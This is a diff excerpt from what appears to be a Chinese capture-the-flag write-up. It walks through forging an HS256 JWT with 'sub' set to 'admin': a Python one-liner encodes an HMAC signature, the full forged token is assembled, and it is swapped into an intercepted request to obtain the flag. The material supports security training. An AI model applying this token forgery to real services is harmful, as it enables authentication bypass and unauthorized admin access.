@@ -64,5 +64,33 @@ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwND
 cc8f2df0816eba134becfa7bec36726d4bc604d11cc71b400c4ddf4f0514c652
 ```
 
+再使用：
 
+```
+python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('cc8f2df0816eba134becfa7bec36726d4bc604d11cc71b400c4ddf4f0514c652')).replace('=','')\")"
+```
+
+获取加密后的base64码组成最后一段签名
+
+完整JWT签名：
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDc2MTg5Nn0.zI8t8IFuuhNL7Pp77DZybUvGBNEcxxtADE3fTwUUxlI
+```
+
+包含信息：
+
+```
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+{
+  "sub": "admin",
+  "exp": 1604761896
+}
+signature
+```
+
+抓包更改jwt，欺骗成功获取flag
 
